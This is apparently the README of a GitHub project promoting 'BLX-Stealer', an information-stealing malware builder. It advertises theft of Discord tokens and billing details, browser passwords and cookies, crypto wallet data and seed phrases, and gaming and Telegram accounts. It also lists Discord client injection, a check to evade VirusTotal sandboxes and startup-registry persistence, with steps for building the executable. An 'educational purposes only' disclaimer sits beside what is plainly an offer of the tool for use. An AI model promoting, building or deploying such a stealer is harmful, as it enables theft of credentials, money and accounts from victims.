  <div align="center">
  <div>
    <img  src="img/image1.png">
  </div>
    <br>
  </div>

</p>
<p align="center">
    <img src="https://img.shields.io/github/stars/blxstealer/BLX-Stealer?color=%23000000&logoColor=%23000000">
    <img src="https://img.shields.io/github/forks/blxstealer/BLX-Stealer?color=%23000000"> 
    <br>
    <img src="https://img.shields.io/github/languages/top/blxstealer/BLX-Stealer?color=%23000000">
    <img src="https://img.shields.io/github/last-commit/blxstealer/BLX-Stealer?color=%23000000&logoColor=%23000000">
    <br>
    <img src="https://img.shields.io/github/issues/blxstealer/BLX-Stealer?color=%23000000&logoColor=%23000000">
    <img src="https://img.shields.io/github/issues-closed/blxstealer/BLX-Stealer?color=%23000000&logoColor=%23000000">
    <br>
</p>
 
<p align="center">
  Telegram: https://t.me/blxstealer
  Discord: https://discord.com/invite/uTsr3VPcVa  
<br>

</p>
<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">

## UPDATED

- What is the news?
    - New Machine Information!
    - New Roblox Information!
    - Injection Fixed.
    - Added Customizable Stealer to Builder.
    
## Features

-   Discord Information
    -   Nitro
    -   Badges
    -   Billing
    -   Email
    -   Phone
    -   HQ Friends
-   Browser Data
    -   Cookies
    -   Passwords
    -   Roblox Information
    -   From Chrome, Edge, Brave, Opera GX, and many more... 
-   Crypto Data
    -   Extensions (MetaMask, Phantom, Trust Wallet, Coinbase Wallet, Binance Wallet)
    -   Softwares (Exodus Wallet, Atomic Wallet)
    -   Seedphrases
-   Application Data
    -   Steam
    -   Riot Games
    -   Telegram
-   Discord Injection
    -   Send token, password, and email on login, credit card/paypal added, nitro bought or when password/mail is changed
-   System Information
    -   User
    -   System
    -   Disk
    -   Network
-   Anti-debug

    -   Check if being run in a VirusTotal sandbox

-   Startup Persistence
    -   Place stub in appdata
    -   Add to startup registry

## Compatibility

| Browsers           | Cookies and Token Grabber | Password Stealer | Roblox Information
| :-----------:      | :-----------: | :-----------: | :-----------: |
| Chrome             | ✅ | ✅ | ✅ |
| Edge               | ✅ | ✅ | ✅ |
| Brave              | ✅ | ✅ | ✅ |
| Firefox            | ✅ | ✅ | ✅ |
| Opera (GX)         | ✅ | ✅ | ✅ |
| Opera              | ✅ | ✅ | ✅ |
| Yandex             | ✅ | ✅ | ✅ |
| Chromium           | ❌ | ❌ | ✅ |

## Install

### Prerequisites

-   Windows 10/11
-   [Python](https://www.python.org/downloads/release/python-3109/)
-   [Git](https://git-scm.com/download/win)

### Setup

1. [Download source code zip](https://github.com/blxstealer/BLX-Stealer/archive/refs/heads/main.zip)
2. Extract zip
3. First install reqiured packages by double clicking `install.bat` file
4. Run the builder by double clicking the `builder.bat` file
5. Follow instructions in builder and your exe will be found in the `dist` folder under the name `blxstealer.exe`

<div align="center">
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/img4.png"></img>
    <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="75%">    
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/img6.png"></img>
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/img1.png"></img>
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/roblox.png"></img>
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/img2.png"></img>
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/img3.png"></img>
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/img5.png"></img>
    <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="75%"> 
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/imagee0.png"></img>
  
</div>

## Disclaimer:

This tool is for educational purposes only. It is coded for you to see how your files are simply stolen and how to take action. Do not use for illegal purposes. We are never responsible for illegal use. <bold>Educational purpose only!</bold>

## License:
By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see https://commonsclause.com/.

## Thanks to;
[![Stargazers repo roster for @blxstealer/BLX-Stealer](https://reporoster.com/stars/blxstealer/BLX-Stealer)](https://github.com/blxstealer/BLX-Stealer/stargazers)

<img  src="img/image2.png">
